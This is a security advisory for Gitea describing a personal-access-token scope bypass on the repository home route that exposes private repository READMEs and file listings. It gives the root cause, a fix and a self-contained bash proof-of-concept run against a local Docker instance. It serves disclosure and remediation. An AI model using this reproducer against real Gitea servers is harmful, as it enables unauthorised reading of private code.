# [M] Gitea: Personal access token scope enforcement bypass on the repository home page (`GET /{owner}/{repo}`) discloses private repository contents

## Summary
Severity: Medium
Advisory: GHSA-cp3q-vrj2-ghhh
CVE: CVE-2026-58444
CWE: CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-07-21
Source: https://github.com/advisories/GHSA-cp3q-vrj2-ghhh
Type: github-advisory

## Affected
- Go: `code.gitea.io/gitea` — affected >=0 <1.27.0

## Details
### Summary
A personal access token (PAT) or OAuth2 token that does **not** carry the
`repository` scope or that is **public-only** is correctly rejected (HTTP 403)
by the recently hardened web content routes (archive download, raw/media file
download, and repository RSS/Atom feeds). However, the repository home page route
`GET /{owner}/{repo}` (handler `repo.Home`) serves the **private** repository's
rendered README, root file/directory tree, description, language statistics,
license, and latest-release information to that same token.

This is a token-scope enforcement bypass and private-repository content
disclosure. It is the same source→sink pattern already fixed for neighbouring
routes in:

- **GHSA-cr4g-f395-h25h** (CVE-2026-20706) token scope bypass on web archive download
- **GHSA-3pww-vcvm-3gmj** (CVE-2026-27761) token scope bypass on repository RSS/Atom feeds

`repo.Home` is the remaining token-auth-enabled content route that was not given
the guard.

### Details / Root cause
Web routes accept token authentication only when explicitly opted in with
`webAuth.AllowBasic` / `webAuth.AllowOAuth2`. The repository home route carries
`AllowBasic` (added so that `go get` can resolve private modules):

```go
// routers/web/web.go:1256
m.Get("/{username}/{reponame}", optSignIn, webAuth.AllowBasic,
      context.RepoAssignment, context.RepoRefByType(git.RefTypeBranch),
      repo.SetEditorconfigIfExists, repo.Home)
```

When a PAT/OAuth2 token is supplied via HTTP Basic auth, `services/auth/basic.go`
sets `IsApiToken = true` and records `ApiTokenScope`:

```go
// services/auth/basic.go
store.GetData()["IsApiToken"] = true
store.GetData()["ApiTokenScope"] = token.Scope
```

The patched sibling handlers all call the web-side scope guard
`context.CheckRepoScopedToken(...)`, which enforces both the public-only
restriction and the `repository` scope:

```
routers/web/repo/download.go:23     (raw / media / archive)  ← GHSA-cr4g
routers/web/feed/render.go:15       (all repo feeds)         ← GHSA-3pww
routers/web/repo/attachment.go:190  (attachments / release assets, centralized)
routers/web/repo/githttp.go:161     (git smart HTTP)         ← GHSA-cc8w
```

`repo.Home` (`routers/web/repo/view_home.go:389`) performs **no** such check. Its
only gate is `checkHomeCodeViewable`, which verifies the **user's** permission and
that the code unit is enabled neither of which constrains the **token's** scope.
The README, file listing, and sidebar are then rendered. (The
`handleRepoHomeFeed` sub-path is guarded via `ShowRepoFeed`, but the HTML repo
view is not.)

### Proof of Concept
Reproduced against `gitea/gitea:main-nightly` (build `g2e1be0b114`, identical to
the source commit above). A private repository `admin/secretrepo` is created, and
a token is minted with **only** the `read:user` scope (no `repository` scope).

```
=== anonymous baseline (repository is private) ===
  anon GET /admin/secretrepo                       HTTP=404
=== same no-repo-scope token across routes ===
  API repo get (proves token lacks repo scope)     HTTP=403 canary=0
  /admin/secretrepo/archive/main.zip  (control)    HTTP=403 canary=0
  /admin/secretrepo/raw/branch/main/README.md      HTTP=403 canary=0
  /admin/secretrepo.rss               (control)    HTTP=403 canary=0
  /admin/secretrepo  (repo.Home, VULN)             HTTP=200 canary=1
```

A second token with scope `public-only,read:repository` behaves identically:
`/archive` → 403, but `/admin/secretrepo` → 200 and returns the private content.

`canary=1` means the private README marker was returned in the HTML response; the
private file name `SECRET.md` is also disclosed in the rendered file tree.

Full self-contained reproducer (Docker, prints a PASS/FAIL verdict):

```bash
#!/usr/bin/env bash
set -euo pipefail
N=gitea-poc; PW='Adm1n!pass99'; CANARY='TOP-SECRET-CANARY-9F3A2'
docker rm -f $N >/dev/null 2>&1 || true
docker run -d --name $N \
  -e GITEA__security__INSTALL_LOCK=true -e GITEA__database__DB_TYPE=sqlite3 \
  -e GITEA__server__ROOT_URL=http://localhost:3000/ \
  -e GITEA__service__DISABLE_REGISTRATION=true \
  -p 3000:3000 gitea/gitea:main-nightly >/dev/null
for i in $(seq 1 40); do
  [ "$(curl -s -o /dev/null -w '%{http_code}' http://localhost:3000/api/healthz)" = 200 ] && break; sleep 2; done
docker exec -u git $N gitea admin user create --admin --username admin \
  --password "$PW" --email admin@example.com --must-change-password=false >/dev/null
curl -s -u admin:"$PW" -X POST http://localhost:3000/api/v1/user/repos \
  -H 'Content-Type: application/json' \
  -d '{"name":"secretrepo","private":true,"auto_init":true,"default_branch":"main"}' >/dev/null
SHA=$(curl -s -u admin:"$PW" http://localhost:3000/api/v1/repos/admin/secretrepo/contents/README.md \
  | python3 -c "import json,sys;print(json.load(sys.stdin)['sha'])")
curl -s -u admin:"$PW" -X PUT http://localhost:3000/api/v1/repos/admin/secretrepo/contents/README.md \
  -H 'Content-Type: application/json' \
  -d '{"content":"'"$(printf '# %s\nprivate' "$CANARY" | base64)"'","message":"u","sha":"'"$SHA"'","branch":"main"}' >/dev/null
TOK=$(docker exec -u git $N gitea admin user generate-access-token --username admin \
  --scopes read:user --token-name norepo --raw | tail -1)
echo "anon  : $(curl -s -o /dev/null -w '%{http_code}' http://localhost:3000/admin/secretrepo)"
for p in "archive/main.zip" "raw/branch/main/README.md" ".rss" ""; do
  o=$(curl -s -u admin:"$TOK" -w '|%{http_code}' "http://localhost:3000/admin/secretrepo${p:+/}$p")
  echo "/$p -> ${o##*|}  canary=$(printf '%s' "$o" | grep -c "$CANARY" || true)"
done
echo "PASS if controls=403/404 and repo.Home (last line)=200 canary=1"
docker rm -f $N >/dev/null
```

### Impact
Any holder of a non-`repository`-scoped or public-only token belonging to a user
who has access to private repositories can read those repositories' README, root
file/directory listing, description, languages, license, and latest release
content the token was explicitly scoped to be unable to read. This defeats the
purpose of fine-grained and public-only tokens (for example a CI token granted
only `read:issue`, or a `public-only` token issued to a third-party integration).

The disclosure is bounded to the repository root view because the deeper
`/{owner}/{repo}/src/*` routes do not enable `AllowBasic`.

### Suggested remediation
Mirror the sibling handlers: at the start of `repo.Home`
(`routers/web/repo/view_home.go`), or as route middleware on `routers/web/web.go:1256`,
add:

```go
context.CheckRepoScopedToken(ctx, ctx.Repo.Repository, auth_model.Read)
if ctx.Written() {
    return
}
```

It is also worth auditing the other `AllowBasic`/`AllowOAuth2` web routes that
render repository data for the same omission notably
`actions.GetWorkflowBadge` (`routers/web/web.go:1568`), which currently exposes a
private repository's workflow build status (pass/fail) to a token without the
`repository` scope (lower impact, possibly intended since badges are designed to
be embeddable, but worth confirming).

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-cp3q-vrj2-ghhh
- https://github.com/go-gitea/gitea
- https://github.com/go-gitea/gitea/releases/tag/v1.27.0
